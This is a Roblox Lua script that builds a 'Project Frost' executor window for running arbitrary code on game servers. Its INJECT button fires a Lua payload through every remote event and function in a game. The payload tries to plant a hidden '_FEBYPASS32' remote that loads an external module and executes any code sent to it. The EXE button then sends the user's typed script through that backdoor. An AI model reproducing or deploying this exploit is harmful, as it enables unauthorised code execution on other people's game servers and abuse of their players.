--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @Rxs
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local G2L = {}

G2L["ScreenGui_1"] = Instance.new("ScreenGui", playerGui)
G2L["ScreenGui_1"].Name = "ProjectFrost"
G2L["ScreenGui_1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling

CollectionService:AddTag(G2L["ScreenGui_1"], "main")

local Frame = Instance.new("Frame", G2L["ScreenGui_1"])
Frame.Name = "MainFrame"
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Size = UDim2.new(0.65, 0, 0.62, 0)
Frame.Position = UDim2.new(0.02, 0, 0.04, 0)
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel", Frame)
Title.Name = "Title"
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.Size = UDim2.new(0.99, 0, 0.05, 0)
Title.Position = UDim2.new(0, 0, -0.03, 0)
Title.Text = "🐱 Project Frost (private)"
Title.TextScaled = true
Title.Font = Enum.Font.SourceSansBold
Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.TextXAlignment = Enum.TextXAlignment.Left

local Scriptbox = Instance.new("TextBox", Frame)
Scriptbox.Name = "Scriptbox"
Scriptbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scriptbox.Size = UDim2.new(0.81, 0, 0.87, 0)
Scriptbox.Position = UDim2.new(0.01, 0, 0.05, 0)
Scriptbox.ClearTextOnFocus = false
Scriptbox.Text = ""
Scriptbox.TextColor3 = Color3.fromRGB(0, 0, 0)
Scriptbox.Font = Enum.Font.Code
Scriptbox.TextWrapped = true
Scriptbox.MultiLine = true
Scriptbox.CursorPosition = -1

local InjectBtn = Instance.new("TextButton", Frame)
InjectBtn.Name = "Inject"
InjectBtn.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
InjectBtn.Size = UDim2.new(0.14, 0, 0.23, 0)
InjectBtn.Position = UDim2.new(0.85, 0, 0.61, 0)
InjectBtn.Text = "INJECT"
InjectBtn.TextScaled = true
InjectBtn.Font = Enum.Font.SourceSans
InjectBtn.TextWrapped = true

local ExecuteBtn = Instance.new("TextButton", Frame)
ExecuteBtn.Name = "Execute"
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
ExecuteBtn.Size = UDim2.new(0.14, 0, 0.23, 0)
ExecuteBtn.Position = UDim2.new(0.85, 0, 0.11, 0)
ExecuteBtn.Text = "EXE"
ExecuteBtn.TextScaled = true
ExecuteBtn.Font = Enum.Font.SourceSans
ExecuteBtn.TextWrapped = true

local ClearBtn = Instance.new("TextButton", Frame)
ClearBtn.Name = "Clear"
ClearBtn.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
ClearBtn.Size = UDim2.new(0.14, 0, 0.23, 0)
ClearBtn.Position = UDim2.new(0.85, 0, 0.36, 0)
ClearBtn.Text = "CLEAR"
ClearBtn.TextScaled = true
ClearBtn.Font = Enum.Font.SourceSans
ClearBtn.TextWrapped = true

local StatusLabel = Instance.new("TextLabel", Frame)
StatusLabel.Name = "Injectedstatus"
StatusLabel.BackgroundTransparency = 1
StatusLabel.Size = UDim2.new(0.16, 0, 0.04, 0)
StatusLabel.Position = UDim2.new(0.01, 0, 0.94, 0)
StatusLabel.Text = "Not Injected!"
StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
StatusLabel.Font = Enum.Font.SourceSans
StatusLabel.TextScaled = true

local InjectedFlag = Instance.new("BoolValue", StatusLabel)
InjectedFlag.Name = "Injected?"

local RemoteToRunOffOf = nil

InjectBtn.MouseButton1Click:Connect(function()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local success, err = pcall(function()
                if v:IsA("RemoteEvent") then
                    v:FireServer([[
                        local folder = Instance.new('RemoteEvent')
                        folder.Name = "_FEBYPASS32"
                        folder.Parent = game:GetService("JointsService")
                        local loadstring = require(13684410229)
                        folder.OnServerEvent:Connect(function(_1,_2)
                            loadstring(_2)()
                        end)
                    ]])
                else
                    v:InvokeServer([[
                        local folder = Instance.new('RemoteEvent')
                        folder.Name = "_FEBYPASS32"
                        folder.Parent = game:GetService("JointsService")
                        local loadstring = require(13684410229)
                        folder.OnServerEvent:Connect(function(_1,_2)
                            loadstring(_2)()
                        end)
                    ]])
                end
            end)
            if success then
                RemoteToRunOffOf = v
                InjectedFlag.Value = true
                StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                StatusLabel.Text = "Injected!"
                return
            end
        end
    end
    InjectedFlag.Value = false
    StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    StatusLabel.Text = "Failed To Inject."
end)

ExecuteBtn.MouseButton1Click:Connect(function()
    if RemoteToRunOffOf then
        if RemoteToRunOffOf:IsA("RemoteEvent") then
            RemoteToRunOffOf:FireServer(Scriptbox.Text)
        else
            RemoteToRunOffOf:InvokeServer(Scriptbox.Text)
        end
    else
        warn("No remote hooked Pls inject first.")
    end
end)

ClearBtn.MouseButton1Click:Connect(function()
    Scriptbox.Text = ""
end)

return G2L["ScreenGui_1"]
